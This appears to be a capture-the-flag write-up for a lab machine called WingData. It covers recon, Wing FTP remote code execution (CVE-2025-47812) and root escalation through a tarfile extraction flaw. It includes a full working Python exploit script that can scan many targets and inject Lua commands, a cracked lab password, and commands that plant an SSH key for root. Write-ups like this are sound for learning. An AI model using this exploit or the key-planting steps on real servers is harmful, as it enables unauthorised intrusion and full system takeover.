## RECON

<img width="1020" height="268" alt="Screenshot 2026-04-16 at 11 26 01" src="https://github.com/user-attachments/assets/c8be96e5-4a82-4db2-ac6f-93cf20d04bc6" />

active ports are ::

22 -- ssh 
80 -- http

## port 80 ::

<img width="1470" height="942" alt="Screenshot 2026-04-16 at 11 26 55" src="https://github.com/user-attachments/assets/958045b3-fa32-4aa7-91ad-cf0372598764" />

acessing the client portal 

redirecting from wingdata.htb to the ftp.windata.htb. so DNS map the following address also.

<img width="1470" height="956" alt="Screenshot 2026-04-16 at 11 31 58" src="https://github.com/user-attachments/assets/7d37d1dd-4f9a-4de5-a9cf-bb0973e51617" />


## cve 2025-47182

the WingFTP server users lua script for the login page and it handles the username field unsafely. it allows the nullbyte charecters and newline charecters which will help us to write our own script after the username.

https://medium.com/@defencerabbit/cve-2025-47812-wing-ftp-remote-code-execution-99a4400e7488

python script ::

```
import requests
import re
import argparse

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

def print_green(text):
    print(f"{GREEN}{text}{RESET}")

def print_red(text):
    print(f"{RED}{text}{RESET}")

def run_exploit(target_url, command, username="anonymous", verbose=False):
    login_url = f"{target_url}/loginok.html"

    login_headers = {
        "Host": target_url.split('//')[1].split('/')[0],
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": target_url,
        "Connection": "keep-alive",
        "Referer": f"{target_url}/login.html?lang=english",
        "Cookie": "client_lang=english",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }


    from urllib.parse import quote
    encoded_username = quote(username)

    payload = (
        f"username={encoded_username}%00]]%0dlocal+h+%3d+io.popen(\"{command}\")%0dlocal+r+%3d+h%3aread(\"*a\")"
        "%0dh%3aclose()%0dprint(r)%0d--&password="
    )

    if verbose:
        print_green(f"[+] Sending POST request to {login_url} with command: '{command}' and username: '{username}'")

    try:
        login_response = requests.post(login_url, headers=login_headers, data=payload, timeout=10)
        login_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Error sending POST request to {login_url}: {e}")
        return False

    set_cookie = login_response.headers.get("Set-Cookie", "")
    match = re.search(r'UID=([^;]+)', set_cookie)

    if not match:
        print_red("[-] UID not found in Set-Cookie. Exploit might have failed or response format changed.")
        return False

    uid = match.group(1)
    if verbose:
        print_green(f"[+] UID extracted: {uid}")

    dir_url = f"{target_url}/dir.html"
    dir_headers = {
        "Host": login_headers["Host"],
        "User-Agent": login_headers["User-Agent"],
        "Accept": login_headers["Accept"],
        "Accept-Language": login_headers["Accept-Language"],
        "Accept-Encoding": login_headers["Accept-Encoding"],
        "Connection": "keep-alive",
        "Cookie": f"UID={uid}",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    if verbose:
        print_green(f"[+] Sending GET request to {dir_url} with UID: {uid}")

    try:
        dir_response = requests.get(dir_url, headers=dir_headers, timeout=10)
        dir_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Error sending GET request to {dir_url}: {e}")
        return False

    body = dir_response.text
    clean_output = re.split(r'<\?xml', body)[0].strip()

    if verbose:
        print_green("\n--- Command Output ---")
        print(clean_output)
        print_green("----------------------")
    else:
        if clean_output:
            print_green(f"[+] {target_url} is vulnerable!")
        else:
            print_red(f"[-] {target_url} is NOT vulnerable.")

    return bool(clean_output)

def main():
    parser = argparse.ArgumentParser(description="Exploit script for command injection via login.html.")
    parser.add_argument("-u", "--url", type=str,
                        help="Target URL (e.g., http://192.168.134.130). Required if -f not specified.")
    parser.add_argument("-f", "--file", type=str,
                        help="File containing list of target URLs (one per line).")
    parser.add_argument("-c", "--command", type=str,
                        help="Custom command to execute. Default: whoami. If specified, verbose output is enabled automatically.")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show full command output (verbose mode). Ignored if -c is used since verbose is auto-enabled.")
    parser.add_argument("-o", "--output", type=str,
                        help="File to save vulnerable URLs.")
    parser.add_argument("-U", "--username", type=str, default="anonymous",
                        help="Username to use in the exploit payload. Default: anonymous")

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error("Either -u/--url or -f/--file must be specified.")

    command_to_use = args.command if args.command else "whoami"
    verbose_mode = True if args.command else args.verbose

    vulnerable_sites = []

    targets = []
    if args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print_red(f"[-] Could not read target file '{args.file}': {e}")
            return
    else:
        targets = [args.url]

    for target in targets:
        print(f"\n[*] Testing target: {target}")
        is_vulnerable = run_exploit(target, command_to_use, username=args.username, verbose=verbose_mode)
        if is_vulnerable:
            vulnerable_sites.append(target)

    if args.output and vulnerable_sites:
        try:
            with open(args.output, 'w') as out_file:
                for site in vulnerable_sites:
                    out_file.write(site + "\n")
            print_green(f"\n[+] Vulnerable sites saved to: {args.output}")
        except Exception as e:
            print_red(f"[-] Could not write to output file '{args.output}': {e}")

if __name__ == "__main__":
    main()
```


<img width="1397" height="128" alt="Screenshot 2026-04-16 at 18 40 51" src="https://github.com/user-attachments/assets/90d416c8-c101-43eb-892d-6abe3d8be049" />

### Remote Code Execution (RCE) ::

<img width="1390" height="216" alt="Screenshot 2026-04-16 at 18 45 58" src="https://github.com/user-attachments/assets/fc1db5b6-07c7-4c39-aab1-6463617ad8dd" />

<img width="1395" height="225" alt="Screenshot 2026-04-16 at 21 53 43" src="https://github.com/user-attachments/assets/5a86a80a-cc7b-404c-87a3-4b68b3c1f89d" />

got a user -- **wacky**

in wingdata the files are the xml files which store the information about the users and all so searching for the .xml files in the server.

<img width="1389" height="478" alt="Screenshot 2026-04-17 at 14 57 32" src="https://github.com/user-attachments/assets/bf92d9ca-1062-4b48-b2fe-10ff46055f93" />

here the admins.xml store the admin user of the wingftp credentials for the wingftp server that is present in the browser.

if we get the get the credentials of the admin user then we can be able to execute the cve 2025 - 47811 which will help us to get the root access of the user. 

cve 2025 - 47811 :: the administrators which are communicated on the port number 5466 they are able to execute the commands with root privilages of the system.

https://www.sentinelone.com/vulnerability-database/cve-2025-47811/

getting the hashes of the wacky and admin passwords.

getting the base64 output of the things in the admins.xml so that all the content in that will be read as plain text.

output without base64 :

<img width="1391" height="248" alt="Screenshot 2026-04-17 at 15 06 00" src="https://github.com/user-attachments/assets/0eea176d-2649-4650-9beb-ad2a17475aba" />

ouput with base64 :
<img width="1390" height="411" alt="Screenshot 2026-04-17 at 15 03 38" src="https://github.com/user-attachments/assets/1b12cdb2-5756-4ef1-a908-c61964ea2d3c" />

decode both wacky and the admin xml files ::

**admin.xml ::**

<img width="970" height="320" alt="Screenshot 2026-04-17 at 15 07 53" src="https://github.com/user-attachments/assets/5ce42911-4105-419b-a067-7c9f18f9cd03" />

**wacky.xml ::**
<img width="1110" height="188" alt="Screenshot 2026-04-17 at 15 11 02" src="https://github.com/user-attachments/assets/f49ad8aa-1707-4925-9073-820a5b6c0aca" />

this both hash passwords are **sha - 256**

bruteforcing using the rockyou.txt for the passwords.

### wacky password 

**wacky -- !#7Blushing^*Bride5**

here we got the password of the wacky user only so i was unable to execute the cve 2025 - 47811 . so instead using the wacky user i logged in to the ssh and got the useer flag and then we should do the privilage escalation.

### SSH login

<img width="906" height="291" alt="Screenshot 2026-04-17 at 19 30 40" src="https://github.com/user-attachments/assets/4dfe6f8a-e203-4dc6-b260-0779cf15e9fb" />

### user flag

**c40e7cabc4dc2a51e22be79de7aff6e6**

## Privilage Escalation 

<img width="1213" height="136" alt="Screenshot 2026-04-18 at 18 25 13" src="https://github.com/user-attachments/assets/f2c9a332-2aec-4c6f-ae18-825e07eea9a6" />


in the script there is a part ::

```
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

using the exploit of cve 2025-4138 we create an exploit script.



generated a public and private key so that we can plant this key in the .ssh/authorized_keys which will help us to get the root access.

<img width="675" height="396" alt="Screenshot 2026-04-22 at 11 20 33" src="https://github.com/user-attachments/assets/6ae104bb-3d08-464b-b5de-88a4d8debb7a" />

now we are going to implant this keys in the authorized_keys files to get the root permissions for that key.

<img width="1269" height="90" alt="Screenshot 2026-04-22 at 11 23 05" src="https://github.com/user-attachments/assets/34e0b09e-d13f-45d2-ab5e-6a913c08e06d" />

```
python3 /tmp/exploit_cve.py -o /opt/backup_clients/backups/backup_1001.tar -p ssh-key -P /tmp/rootkey.pub
```
this will create a tar file in the backup directory and this file puts the public key from the rootkey.pub to the tar file.

```
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_evil
```

now the tar that we created in the backup directory is executed as the sudo user so it will now write our public key in the authorized_keys file .

now running ssh using the private key that we made before and saved in the rootkey file.

```
ssh -i /tmp/rootkey root@localhost
```

<img width="593" height="91" alt="Screenshot 2026-04-22 at 11 35 04" src="https://github.com/user-attachments/assets/a0ff150b-4a10-465e-a488-259858a6c73e" />


root key ::

### 779f965eb2f45aeda1c2943d3da16bc6
